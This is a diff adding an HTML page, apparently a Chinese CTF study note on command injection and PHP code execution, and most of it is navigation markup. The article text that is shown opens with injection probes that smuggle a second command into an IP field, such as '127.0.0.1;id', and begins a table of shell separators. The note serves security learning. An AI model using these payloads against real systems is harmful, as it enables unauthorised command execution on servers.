+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        五、路径被拦怎么办
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        六、命令替代表
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        七、无回显:三种盲注
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="七、无回显:三种盲注">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ① 时间延迟(最快确认通道)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ② 输出重定向(写到能访问的地方)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-dns-http" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ③ 外带(DNS / HTTP)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        八、代码执行：和命令注入的区别
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="八、代码执行：和命令注入的区别">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#81" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.1 一条命令判断在哪一边
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#82" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.2 最典型的坑
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#83" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.3 两边的 ; 长得一样，意思不同
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        九、PHP 代码执行：绕关键词的四种思路
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="九、PHP 代码执行：绕关键词的四种思路">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#91" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9.1 先搞清黑名单是"拦"还是"换"
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#92" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9.2 四种思路
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#93" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9.3 常用函数速查
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#94" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9.4 两个高频错误
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十、实战记录
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="十、实战记录">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#101-ping-ping-ping" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10.1 [Ping ping ping]（第一道）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#102-newstarctf-so-baby-rce-again" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10.2 [NewStarCTF 公开赛] So Baby RCE Again（无回显）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#103-dest0g3-520-simplerceeval" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10.3 [Dest0g3 520迎新赛] SimpleRCE（eval + 替换型黑名单）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#104-newstarctf-so-baby-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10.4 [NewStarCTF 公开赛] So Baby RCE（子串型黑名单 + 无 /）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#105-2019-rce-me" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10.5 [极客大挑战 2019] RCE ME（字母数字全封 + 按位取反）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_21" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十一、我踩的坑
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="十一、我踩的坑">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 1：全角 ￥ 不是 $
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2ifs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 2：$IFS 后面紧跟路径会粘在一起
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 3：以为 ; 不行就放弃了
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-cat" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 4：只试了 cat,没试替代品
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 5：路径被拦就卡住
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_22" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十二、工具与字典
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="十二、工具与字典">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#121" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.1 测试模板（关键）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#122-burp-intruder" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.2 Burp Intruder 设置
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#123" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.3 判读速查
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_27" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十三、常用命令速查
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_28" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十四、一句话总结
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../web/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web 通用
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_5" id="__nav_2_5_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web 通用
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/CTF-Web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CTF-Web 学习笔记
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../audit/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    代码审计
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_6" id="__nav_2_6_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    代码审计
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../audit/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8-PHP%E4%B8%8EJava/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    代码审计入门
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../blog/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WP 博客
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    WP 博客
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    归档
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    归档
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/archive/2026/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2026
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    分类
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    分类
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/portswigger/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PortSwigger
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    代码执行
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    命令注入
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文件上传
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../files/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    工具字典
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    工具字典
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        一、先判断有没有注入
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="一、先判断有没有注入">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        最基础的三条
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        判断"到底执行了什么"
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        先摸清回显位置
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        二、分隔符:怎么把命令接上去
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        三、空格被拦怎么办
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        四、关键词被拦怎么办
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="四、关键词被拦怎么办">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ① 引号拆分
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ② 反斜杠转义
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ③ 通配符
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ④ 变量拼接
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ⑤ 命令替代(路径被拦时最好用)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ⑥ 大小写 / 编码
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        五、路径被拦怎么办
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        六、命令替代表
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        七、无回显:三种盲注
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="七、无回显:三种盲注">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ① 时间延迟(最快确认通道)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ② 输出重定向(写到能访问的地方)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-dns-http" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ③ 外带(DNS / HTTP)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        八、代码执行：和命令注入的区别
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="八、代码执行：和命令注入的区别">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#81" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.1 一条命令判断在哪一边
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#82" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.2 最典型的坑
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#83" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.3 两边的 ; 长得一样，意思不同
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        九、PHP 代码执行：绕关键词的四种思路
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="九、PHP 代码执行：绕关键词的四种思路">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#91" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9.1 先搞清黑名单是"拦"还是"换"
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#92" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9.2 四种思路
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#93" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9.3 常用函数速查
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#94" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9.4 两个高频错误
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十、实战记录
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="十、实战记录">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#101-ping-ping-ping" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10.1 [Ping ping ping]（第一道）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#102-newstarctf-so-baby-rce-again" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10.2 [NewStarCTF 公开赛] So Baby RCE Again（无回显）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#103-dest0g3-520-simplerceeval" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10.3 [Dest0g3 520迎新赛] SimpleRCE（eval + 替换型黑名单）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#104-newstarctf-so-baby-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10.4 [NewStarCTF 公开赛] So Baby RCE（子串型黑名单 + 无 /）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#105-2019-rce-me" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10.5 [极客大挑战 2019] RCE ME（字母数字全封 + 按位取反）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_21" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十一、我踩的坑
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="十一、我踩的坑">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 1：全角 ￥ 不是 $
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2ifs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 2：$IFS 后面紧跟路径会粘在一起
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 3：以为 ; 不行就放弃了
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-cat" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 4：只试了 cat,没试替代品
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 5：路径被拦就卡住
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_22" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十二、工具与字典
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="十二、工具与字典">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#121" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.1 测试模板（关键）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#122-burp-intruder" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.2 Burp Intruder 设置
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#123" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.3 判读速查
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_27" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十三、常用命令速查
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_28" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十四、一句话总结
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="rce-php">RCE 专题（命令注入 + PHP 代码执行）<a class="headerlink" href="#rce-php" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p><strong>一句话:应用把你的输入拼进了系统命令,于是你能让它执行任意命令。</strong></p>
+<p>三要素:<strong>入口</strong>(输入框/参数) → <strong>拼接</strong>(没过滤就进了 shell) → <strong>执行</strong>(回显/盲注/外带)。</p>
+<p><strong>这份文档分两部分：</strong></p>
+<p><strong>A. 命令注入</strong>（第 1–6、9 章）—— 执行的是<strong>系统命令</strong>，sink 是 <code>system</code> / <code>exec</code> / 反引号
+<strong>B. 代码执行</strong>（第 8–9 章）—— 执行的是<strong>PHP 代码</strong>，sink 是 <code>eval</code> / <code>assert</code></p>
+<p><strong>两套打法完全不同，混了就会卡在"没反应"。先看第八章分清自己在哪一边。</strong></p>
+</blockquote>
+<hr />
+<h2 id="_1">一、先判断有没有注入<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h3 id="_2">最基础的三条<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>127.0.0.1;id
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>127.0.0.1|id
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>127.0.0.1&amp;&amp;id
+</span></code></pre></div>
+<p><strong>看到 <code>uid=33(www-data)</code> 之类 → 有注入 ✅</strong></p>
+<h3 id="_3">判断"到底执行了什么"<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p><strong>有些应用只显示"ping 成功",不显示命令输出 → 需要盲注(见第七节)。</strong></p>
+<h3 id="_4">先摸清回显位置<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p><strong>命令的输出可能出现在：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>· 页面正文
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>· &lt;pre&gt; 块里
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>· 报错信息里
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>· 完全看不到(盲注)
+</span></code></pre></div>
+<hr />
+<h2 id="_5">二、分隔符:怎么把命令接上去<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>分隔符</th>
+<th>行为</th>
+<th>什么时候用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><code>;</code></strong></td>
+<td><strong>顺序执行</strong>(前一条成功失败都继续)</td>
+<td>最通用</td>
+</tr>
+<tr>
+<td><strong><code>\|</code></strong></td>
+<td><strong>管道</strong>:左边输出给右边</td>
+<td>想让输出被处理</td>
+</tr>
+<tr>
+<td><strong><code>\|\|</code></strong></td>
